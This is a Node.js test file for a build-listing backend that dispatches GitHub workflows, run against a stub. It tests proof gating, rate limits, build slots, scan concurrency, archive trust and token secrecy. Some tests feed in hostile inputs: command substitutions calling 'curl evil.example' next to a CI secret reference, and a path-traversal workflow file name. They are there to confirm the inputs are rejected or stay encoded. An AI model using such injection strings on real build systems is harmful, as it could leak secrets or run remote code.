// The listing flow on the workflow backend (node P15), through the API, against a stub of GitHub: what gates a
// build, the limits, the slots, and what is offered at the end. No test reaches GitHub.
import { test, describe, afterEach } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';

import { Wallet } from 'ethers';
import { decodeSiteRequest } from '@verdikta/stake-attestation-shared/site-request';

import { codeReview } from '../src/common.js';
import { ConfigError, loadConfig } from '../src/config.js';
import { draftSpec, fakeBuilder, listingRequest } from './helpers/fixtures.js';
import { SUCCESS, failed, startGithubStub } from './helpers/githubStub.js';
import { proofFile } from './helpers/gitRepo.js';
import { quietLogger, startApi } from './helpers/http.js';
import { fakeScanner } from './helpers/scan.js';
import { SIGNED_ARTIFACT, TOKEN, signedListing, workflowEnv, zipOf } from './helpers/workflowRun.js';

const open = [];
afterEach(async () => {
  for (const x of open.splice(0)) await x();
});

const TERMINAL = new Set(['ready', 'refused', 'error']);
const wallets = Array.from({ length: 8 }, () => Wallet.createRandom());

async function setup({ env: over = {}, script, checkRepository, logger = quietLogger() } = {}) {
  const stub = await startGithubStub({ script: script ?? (() => ({ statuses: ['in_progress', failed()] })) });
  open.push(() => stub.close());
  const env = workflowEnv(stub, { SA_MAX_CONCURRENT_BUILDS: '1', ...over });
  const start = async () => {
    const s = await startApi({ config: loadConfig(env), env, scanner: fakeScanner(), checkRepository, logger });
    open.push(() => s.close());
    open.push(() => s.app.buildRuns?.stop());
    return s;
  };
  return { stub, env, logger, start, s: await start() };
}

const request = (wallet, owner = 'acme') => listingRequest({ maker: wallet.address, spec: draftSpec({ repo: `https://github.com/${owner}/vault` }) });

/** Whoever signs, the project's file names them. */
function namingEveryone() {
  let last = null;
  return { set: (a) => { last = a; }, check: async () => ({ reachable: true, ref: 'refs/heads/main', file: { blob: 'b'.repeat(40), text: proofFile(last), problem: null } }) };
}

async function submit(s, wallet, owner) {
  const res = await s.submit(request(wallet, owner), { wallet });
  return { res, json: await res.json() };
}
const until = async (s, id, status, ms = 3000) => {
  const end = Date.now() + ms;
  for (;;) {
    const v = await (await s.get(`/api/listings/${id}`)).json();
    if (v.status === status) return v;
    if (Date.now() > end) throw new Error(`still ${v.status} (${JSON.stringify(v.error)}), wanted ${status}`);
    await new Promise((r) => setTimeout(r, 2));
  }
};

describe('what gates a build', () => {
  test('a listing whose proof fails starts no run: refused by its code, no dispatch, and the overall budget is given back', async () => {
    const { stub, s } = await setup({
      env: { SA_BUILD_LIMIT_OVERALL: '1' },
      checkRepository: async () => ({ reachable: true, ref: 'refs/heads/main', file: { blob: 'b'.repeat(40), text: proofFile('0x5B38Da6a701c568545dCfcB03FcB875f56beddC4'), problem: null } }),
    });
    const { json } = await submit(s, wallets[0]);
    const v = await s.settle(json.id);
    assert.equal(v.status, 'refused');
    assert.equal(v.refusal.code, 'PROOF_NAMES_ANOTHER_ADDRESS');
    assert.equal(stub.state.dispatches.length, 0);
    const again = await submit(s, wallets[1]);
    assert.equal(again.res.status, 202, 'a bad proof costs the budget nothing');
  });

  test('a request the wallet did not sign charges nothing and starts nothing', async () => {
    const { stub, s } = await setup({ env: { SA_BUILD_LIMIT_PER_WALLET: '1' } });
    const res = await s.submit(request(wallets[0]), { wallet: wallets[1] });
    assert.equal(res.status, 403);
    assert.equal(stub.state.dispatches.length, 0);
    const v = await submit(s, wallets[0]);
    assert.equal(v.res.status, 202, 'nobody can use up another wallet\'s attempts');
    await s.settle(v.json.id);
  });

  test('an invalid request, hostile text and all, is never dispatched', async () => {
    const { stub, s } = await setup();
    const bad = request(wallets[0]);
    bad.spec.baseCommit = '$(curl evil)';
    assert.equal((await s.post('/api/listings/challenge', bad)).status, 400);
    assert.equal((await s.post('/api/listings', bad)).status, 400);
    assert.equal(stub.state.dispatches.length, 0);
  });

  test('a request a dispatch could not carry is refused at the challenge, before the wallet signs', async () => {
    const { stub, s } = await setup();
    const body = request(wallets[0]);
    const noise = () => Array.from({ length: 12 }, () => Math.random().toString(36).slice(2)).join(' ');
    body.knownIssues = Array.from({ length: 200 }, () => {
      const b = { title: noise().slice(0, 100), class: 'LOW', paths: ['src/Vault.sol'], description: `${noise()} ${noise()} ${noise()} ${noise()}` };
      return { id: codeReview.knownIssueId(b), ...b };
    });
    const res = await s.post('/api/listings/challenge', body);
    const json = await res.json();
    assert.equal(res.status, 400);
    assert.ok(json.issues.some((i) => i.code === 'DISPATCH_REQUEST_TOO_LARGE'), JSON.stringify(json.issues));
    assert.equal(stub.state.dispatches.length, 0);
  });

  test('hostile text in a valid request reaches the dispatch only inside the encoded blob', async () => {
    const naming = namingEveryone();
    const { stub, s } = await setup({ checkRepository: naming.check });
    const body = request(wallets[0]);
    naming.set(wallets[0].address);
    body.spec.commands.setup = 'echo "${{ secrets.VERDIKTA_KMS_ROLE_ARN }}" $(curl evil.example)';
    const res = await s.submit(body, { wallet: wallets[0] });
    assert.equal(res.status, 202);
    await s.settle((await res.json()).id);
    const [{ body: sent }] = stub.state.dispatches;
    assert.equal(sent.ref, 'main');
    assert.doesNotMatch(JSON.stringify(sent), /secrets\.|curl/);
    assert.equal(JSON.parse(decodeSiteRequest(sent.inputs.request)).spec.commands.setup, body.spec.commands.setup);
  });
});

describe('the limits', () => {
  test('per wallet: one in flight, and its number in the window, by named codes, counted', async () => {
    const naming = namingEveryone();
    const hold = { statuses: ['in_progress'] };
    let plan = hold;
    const { stub, s } = await setup({ checkRepository: naming.check, script: () => plan, env: { SA_BUILD_LIMIT_PER_WALLET: '2', SA_BUILD_RUN_DEADLINE_MS: '100' } });
    naming.set(wallets[0].address);
    const a = await submit(s, wallets[0]);
    assert.equal(a.res.status, 202);
    const inFlight = await submit(s, wallets[0]);
    assert.equal(inFlight.res.status, 429);
    assert.equal(inFlight.json.error, 'MAKER_BUILD_IN_PROGRESS');
    await s.settle(a.json.id);
    plan = { statuses: [failed()] };
    const b = await submit(s, wallets[0]);
    await s.settle(b.json.id);
    const over = await submit(s, wallets[0]);
    assert.equal(over.res.status, 429);
    assert.equal(over.json.error, 'MAKER_BUILD_LIMIT');
    assert.equal(stub.state.dispatches.length, 2);
    assert.ok(s.app.listings.refusedCounts().byReason.MAKER_BUILD_LIMIT >= 1);
  });

  test('several wallets on one repository owner stop at the owner\'s limit: one in flight, and its number in the window', async () => {
    const naming = namingEveryone();
    let plan = { statuses: ['in_progress'] };
    const { stub, s } = await setup({ checkRepository: naming.check, script: () => plan, env: { SA_BUILD_LIMIT_PER_REPO_OWNER: '2', SA_BUILD_RUN_DEADLINE_MS: '100', SA_MAX_CONCURRENT_BUILDS: '2' } });
    naming.set(wallets[0].address);
    const first = await submit(s, wallets[0], 'acme');
    await until(s, first.json.id, 'building');
    naming.set(wallets[1].address);
    const second = await submit(s, wallets[1], 'acme');
    const refused = await s.settle(second.json.id);
    assert.equal(refused.status, 'refused');
    assert.equal(refused.refusal.code, 'REPO_OWNER_BUILD_IN_PROGRESS');
    await s.settle(first.json.id);
    plan = { statuses: [failed()] };
    naming.set(wallets[2].address);
    await s.settle((await submit(s, wallets[2], 'acme')).json.id);
    naming.set(wallets[3].address);
    const over = await s.settle((await submit(s, wallets[3], 'acme')).json.id);
    assert.equal(over.refusal.code, 'REPO_OWNER_BUILD_LIMIT');
    assert.equal(stub.state.dispatches.length, 2);
  });

  test('several wallets and several accounts: the overall limit holds, and a restart does not reset it', async () => {
    const naming = namingEveryone();
    const { stub, s, start } = await setup({ checkRepository: naming.check, script: () => ({ statuses: [failed()] }), env: { SA_BUILD_LIMIT_OVERALL: '3' } });
    for (let i = 0; i < 3; i += 1) {
      naming.set(wallets[i].address);
      await s.settle((await submit(s, wallets[i], `owner${i}`)).json.id);
    }
    naming.set(wallets[4].address);
    const over = await submit(s, wallets[4], 'owner4');
    assert.equal(over.res.status, 429);
    assert.equal(over.json.error, 'BUILD_BUDGET_EXHAUSTED');
    assert.equal(stub.state.dispatches.length, 3);
    const after = await start();
    const again = await submit(after, wallets[5], 'owner5');
    assert.equal(again.res.status, 429);
    assert.equal(again.json.error, 'BUILD_BUDGET_EXHAUSTED');
  });

  test('a dispatch GitHub refused gives the budget back; the wallet\'s attempt stays spent', async () => {
    const naming = namingEveryone();
    const { stub, s } = await setup({ checkRepository: naming.check, env: { SA_BUILD_LIMIT_OVERALL: '1', SA_BUILD_LIMIT_PER_WALLET: '1' } });
    stub.failWith(/dispatches$/, 403);
    naming.set(wallets[0].address);
    const v = await s.settle((await submit(s, wallets[0])).json.id);
    assert.equal(v.error.code, 'BUILD_DISPATCH_FAILED');
    stub.heal();
    naming.set(wallets[1].address);
    const next = await submit(s, wallets[1]);
    assert.equal(next.res.status, 202);
    await s.settle(next.json.id);
  });

  test('/api/status says how much of the budget is used, in numbers', async () => {
    const naming = namingEveryone();
    const { s } = await setup({ checkRepository: naming.check, env: { SA_BUILD_LIMIT_OVERALL: '4' } });
    naming.set(wallets[0].address);
    await s.settle((await submit(s, wallets[0])).json.id);
    const body = await (await s.get('/api/status')).json();
    assert.deepEqual(body.listings.builds, { windowMs: 86400000, used: 1, overall: 4 });
    assert.doesNotMatch(JSON.stringify(body.listings.builds), /0x/);
  });

  test('without the workflow backend there are no limits: the local flow is as it was', async () => {
    const config = loadConfig({ SA_ATTESTATION_TRUST: 'dev', SA_CHAIN_ID: '31337', SA_PINNING: 'mock' });
    assert.equal(config.builds.backend, 'local');
    assert.equal(config.builds.limits, null);
    assert.equal(config.builds.workflow, null);
  });
});

describe('build slots', () => {
  test('waiting for a person is a visible state and holds no slot: the next listing builds, and the backlog of waiting runs is bounded', async () => {
    const naming = namingEveryone();
    const { stub, s } = await setup({
      checkRepository: naming.check,
      script: () => ({ statuses: ['in_progress', 'waiting'] }),
      env: { SA_BUILD_MAX_AWAITING: '2', SA_MAX_QUEUED_BUILDS: '1', SA_BUILD_APPROVAL_DEADLINE_MS: '400' },
    });
    naming.set(wallets[0].address);
    const a = await submit(s, wallets[0], 'one');
    const waiting = await until(s, a.json.id, 'awaiting_approval');
    assert.match(waiting.run.url, /\/actions\/runs\/[0-9]+$/);
    assert.equal(waiting.error, null);
    naming.set(wallets[1].address);
    const b = await submit(s, wallets[1], 'two');
    await until(s, b.json.id, 'awaiting_approval');
    assert.equal(stub.state.dispatches.length, 2, 'the first run\'s wait did not hold the only slot');
    naming.set(wallets[2].address);
    const c = await submit(s, wallets[2], 'three');
    assert.equal(c.res.status, 202);
    await new Promise((r) => setTimeout(r, 30));
    assert.equal(stub.state.dispatches.length, 2, 'no third run while the backlog is full');
    assert.equal((await (await s.get(`/api/listings/${c.json.id}`)).json()).status, 'queued');
    const d = await submit(s, wallets[3], 'four');
    assert.equal(d.res.status, 429, 'and the queue stays bounded');
    assert.equal(d.json.error, 'BUILD_QUEUE_FULL');
    const timedOut = await s.settle(a.json.id);
    assert.equal(timedOut.error.code, 'APPROVAL_DEADLINE');
    assert.equal(timedOut.status, 'error');
    await until(s, c.json.id, 'awaiting_approval');
    assert.equal(stub.state.dispatches.length, 3, 'the wait ended, so the queue moved');
  });

  test('the backlog\'s bound is hard: a place is held from a run\'s start, whatever the slots', async () => {
    const naming = namingEveryone();
    const { stub, s } = await setup({
      checkRepository: naming.check,
      script: () => ({ statuses: ['in_progress', 'in_progress', 'in_progress', 'waiting'] }),
      env: { SA_BUILD_MAX_AWAITING: '2', SA_MAX_CONCURRENT_BUILDS: '3', SA_BUILD_APPROVAL_DEADLINE_MS: '150' },
    });
    const views = [];
    for (let i = 0; i < 3; i += 1) {
      naming.set(wallets[i].address);
      views.push(await submit(s, wallets[i], `owner${i}`));
    }
    await until(s, views[0].json.id, 'awaiting_approval');
    await until(s, views[1].json.id, 'awaiting_approval');
    assert.equal(stub.state.dispatches.length, 2, 'three slots, two places');
    assert.equal((await (await s.get(`/api/listings/${views[2].json.id}`)).json()).status, 'queued');
  });

  test('a hung run gives up its slot at the deadline, the run is cancelled, and the next listing builds', async () => {
    const naming = namingEveryone();
    const { stub, s } = await setup({ checkRepository: naming.check, script: () => ({ statuses: ['in_progress'] }), env: { SA_BUILD_RUN_DEADLINE_MS: '60' } });
    naming.set(wallets[0].address);
    const a = await submit(s, wallets[0], 'one');
    naming.set(wallets[1].address);
    const b = await submit(s, wallets[1], 'two');
    assert.equal((await s.settle(a.json.id)).error.code, 'RUN_DEADLINE');
    assert.equal((await s.settle(b.json.id)).error.code, 'RUN_DEADLINE');
    assert.equal(stub.state.dispatches.length, 2);
    assert.equal(stub.state.cancels.length, 2);
  });

  test('a run that never appears, or a cancel that never takes, holds no slot', async () => {
    const naming = namingEveryone();
    const { stub, s } = await setup({ checkRepository: naming.check, script: () => ({ silent: true }), env: { SA_BUILD_FIND_MS: '20' } });
    naming.set(wallets[0].address);
    const a = await submit(s, wallets[0], 'one');
    naming.set(wallets[1].address);
    const b = await submit(s, wallets[1], 'two');
    assert.equal((await s.settle(a.json.id)).error.code, 'RUN_NOT_FOUND');
    assert.equal((await s.settle(b.json.id)).error.code, 'RUN_NOT_FOUND');
    assert.equal(stub.state.dispatches.length, 2);
  });

  test('a restart: the runs of the last server are found and abandoned, and no slot is taken for them', async () => {
    const naming = namingEveryone();
    const { stub, env, s: first } = await setup({ checkRepository: naming.check, script: () => ({ statuses: ['in_progress'] }), env: { SA_BUILD_RUN_DEADLINE_MS: '4000' } });
    naming.set(wallets[0].address);
    const a = await submit(first, wallets[0], 'one');
    await until(first, a.json.id, 'building');
    assert.equal(stub.state.dispatches.length, 1);
    const run = [...stub.state.runs.values()].at(-1).run;
    const second = await startApi({ config: loadConfig(env), env, scanner: fakeScanner(), checkRepository: naming.check, logger: quietLogger() });
    open.push(() => second.close(), () => second.app.buildRuns.stop());
    await second.app.buildRuns.start();
    assert.deepEqual(stub.state.cancels, [run.id]);
    naming.set(wallets[1].address);
    const b = await submit(second, wallets[1], 'two');
    await until(second, b.json.id, 'building');
    assert.equal(stub.state.dispatches.length, 2);
  });
});

describe('the baseline scan, which stays on this host', () => {
  // The workflow backend with a stand-in builder whose archives verify under dev trust, so a listing reaches its scan
  // in this process; the scan's places are what is under test, not the trust.
  async function scanning({ scanner, concurrent = '1' }) {
    const naming = namingEveryone();
    const stub = await startGithubStub();
    open.push(() => stub.close());
    const env = workflowEnv(stub, { SA_MAX_CONCURRENT_BUILDS: concurrent });
    const config = { ...loadConfig(env), trust: Object.freeze({ mode: 'dev' }) };
    const s = await startApi({ config, env, builder: fakeBuilder(), scanner, checkRepository: naming.check });
    open.push(() => s.close());
    return { s, naming };
  }

  test('scans get places of their own: no more run at once than there are slots, though builds gave theirs back', async () => {
    let now = 0;
    let most = 0;
    const scanner = fakeScanner({ delayMs: 40, onScan: () => { now += 1; most = Math.max(most, now); setTimeout(() => { now -= 1; }, 39); } });
    const { s, naming } = await scanning({ scanner });
    const ids = [];
    for (let i = 0; i < 3; i += 1) {
      naming.set(wallets[i].address);
      ids.push((await submit(s, wallets[i], `scan${i}`)).json.id);
    }
    for (const id of ids) assert.equal((await s.settle(id)).status, 'ready');
    assert.equal(scanner.calls.length, 3);
    assert.equal(most, 1);
  });

  test('a scan that had to be stopped keeps its place until a restart: the next one waits, as a stopped local build keeps its slot', async () => {
    const scanner = fakeScanner({ outcome: 'step-error', holdSlot: true });
    const { s, naming } = await scanning({ scanner });
    naming.set(wallets[0].address);
    const a = await submit(s, wallets[0], 'held');
    await s.settle(a.json.id);
    naming.set(wallets[1].address);
    const b = await submit(s, wallets[1], 'next');
    await until(s, b.json.id, 'scanning');
    await new Promise((r) => setTimeout(r, 50));
    assert.equal((await (await s.get(`/api/listings/${b.json.id}`)).json()).status, 'scanning');
    assert.equal(scanner.calls.length, 1);
  });
});

describe('what is offered', () => {
  test('an archive signed by a key outside common\'s production set is refused, and nothing is pinned or offered', async () => {
    const naming = namingEveryone();
    const body = request(wallets[0]);
    const { folder } = await signedListing({ draft: body.spec, maker: wallets[0].address });
    const stub2 = await startGithubStub({ script: () => ({ statuses: ['in_progress', SUCCESS], artifacts: { [SIGNED_ARTIFACT]: zipOf(folder) } }) });
    open.push(() => stub2.close());
    const env = workflowEnv(stub2);
    const pinned = [];
    naming.set(wallets[0].address);
    const api = await startApi({ config: loadConfig(env), env, scanner: fakeScanner(), checkRepository: naming.check, pinner: { backend: 'mock', pin: async (b) => { pinned.push(b); return 'x'; } } });
    open.push(() => api.close());
    const res = await api.submit(body, { wallet: wallets[0] });
    const v = await api.settle((await res.json()).id);
    assert.equal(v.status, 'error');
    assert.equal(v.error.code, 'ARCHIVE_INVALID');
    assert.match(v.error.detail, /CODE_REVIEW_ATTESTATION/);
    assert.equal(v.archives, null);
    assert.equal(v.list, null);
    assert.equal(pinned.length, 0);
  });

  test('a dev-signed archive is refused the same way: dev trust does not exist on this backend', async () => {
    const naming = namingEveryone();
    const body = request(wallets[0]);
    const { folder } = await signedListing({ draft: body.spec, maker: wallets[0].address, trust: 'dev' });
    const stub = await startGithubStub({ script: () => ({ statuses: [SUCCESS], artifacts: { [SIGNED_ARTIFACT]: zipOf({ ...folder, 'dev-trust.json': '{"dev":true,"keys":[]}' }) } }) });
    open.push(() => stub.close());
    const env = workflowEnv(stub);
    naming.set(wallets[0].address);
    const api = await startApi({ config: loadConfig(env), env, scanner: fakeScanner(), checkRepository: naming.check });
    open.push(() => api.close());
    const v = await api.settle((await (await api.submit(body, { wallet: wallets[0] })).json()).id);
    assert.equal(v.error.code, 'ARCHIVE_INVALID');
    assert.equal(v.devTrust, null);
  });

  test('a built spec that changes what the wallet signed is refused before it is verified or pinned', async () => {
    const naming = namingEveryone();
    const body = request(wallets[0]);
    const { folder } = await signedListing({ draft: body.spec, maker: wallets[0].address, alterSpec: (spec) => { spec.stake.disclosureKey = 'someone else'; } });
    const stub = await startGithubStub({ script: () => ({ statuses: [SUCCESS], artifacts: { [SIGNED_ARTIFACT]: zipOf(folder) } }) });
    open.push(() => stub.close());
    const env = workflowEnv(stub);
    naming.set(wallets[0].address);
    const api = await startApi({ config: loadConfig(env), env, scanner: fakeScanner(), checkRepository: naming.check });
    open.push(() => api.close());
    const v = await api.settle((await (await api.submit(body, { wallet: wallets[0] })).json()).id);
    assert.equal(v.error.code, 'BUILD_CHANGED_SPEC');
  });
});

describe('the token', () => {
  test('never in the config, a view, a log or a dispatch', async () => {
    const naming = namingEveryone();
    const { stub, s, env, logger } = await setup({ checkRepository: naming.check });
    assert.doesNotMatch(JSON.stringify(loadConfig(env)), new RegExp(TOKEN));
    naming.set(wallets[0].address);
    const v = await s.settle((await submit(s, wallets[0])).json.id);
    assert.doesNotMatch(JSON.stringify(v), new RegExp(TOKEN));
    assert.doesNotMatch(logger.lines.join('\n'), new RegExp(TOKEN));
    assert.doesNotMatch(JSON.stringify(stub.state.dispatches.map((d) => d.body)), new RegExp(TOKEN));
  });
});

describe('the configuration', () => {
  const base = { SA_ATTESTATION_TRUST: 'production', SA_CHAIN_ID: '84532', SA_PINNING: 'mock', SA_BUILD_BACKEND: 'workflow', SA_BUILD_WORKFLOW_REPO: 'verdikta/site-builds', SA_BUILD_WORKFLOW_TOKEN: TOKEN };

  test('the workflow backend needs its repository and its token, and takes production trust only', () => {
    const c = loadConfig(base);
    assert.equal(c.builds.backend, 'workflow');
    assert.deepEqual({ repo: c.builds.workflow.repo, file: c.builds.workflow.file, ref: c.builds.workflow.ref, tokenEnv: c.builds.workflow.tokenEnv }, { repo: 'verdikta/site-builds', file: 'stake-attestation-site-build.yml', ref: 'main', tokenEnv: 'SA_BUILD_WORKFLOW_TOKEN' });
    assert.deepEqual(c.builds.limits, { perWallet: 3, perRepoOwner: 5, overall: 20, windowMs: 86400000 });
    assert.equal(c.builds.workflow.runDeadlineMs, 10800000);
    assert.equal(c.builds.workflow.approvalDeadlineMs, 259200000);
    assert.throws(() => loadConfig({ ...base, SA_BUILD_WORKFLOW_REPO: '' }), ConfigError);
    assert.throws(() => loadConfig({ ...base, SA_BUILD_WORKFLOW_REPO: 'no slash' }), ConfigError);
    assert.throws(() => loadConfig({ ...base, SA_BUILD_WORKFLOW_REPO: '../x/y' }), ConfigError);
    assert.throws(() => loadConfig({ ...base, SA_BUILD_WORKFLOW_FILE: '../../evil.yml' }), ConfigError);
    assert.throws(() => loadConfig({ ...base, SA_BUILD_WORKFLOW_TOKEN: '' }), ConfigError);
    assert.throws(() => loadConfig({ ...base, SA_ATTESTATION_TRUST: 'dev' }), ConfigError);
    assert.throws(() => loadConfig({ ...base, SA_CHAIN_ID: '8453' }), /testnet-only/, 'the key is testnet-only (owner, 2026-11-05)');
    assert.throws(() => loadConfig({ ...base, SA_CHAIN_ID: '' }), /testnet-only/);
    assert.throws(() => loadConfig({ ...base, SA_BUILD_BACKEND: 'other' }), ConfigError);
    assert.throws(() => loadConfig({ ...base, SA_GITHUB_API_URL: 'http://api.github.example' }), ConfigError);
    assert.throws(() => loadConfig({ ...base, SA_BUILD_WORKFLOW_SITE: 'Has Space' }), ConfigError);
    assert.throws(() => loadConfig({ ...base, SA_BUILD_LIMIT_OVERALL: '0' }), ConfigError);
  });

  test('the limits\' state lives in the data folder', () => {
    const dir = fs.mkdtempSync(path.join('/tmp', 'sa-cfg-'));
    assert.equal(loadConfig({ ...base, SA_DATA_DIR: dir }).builds.stateFile, path.join(dir, 'build-budget.json'));
  });
});
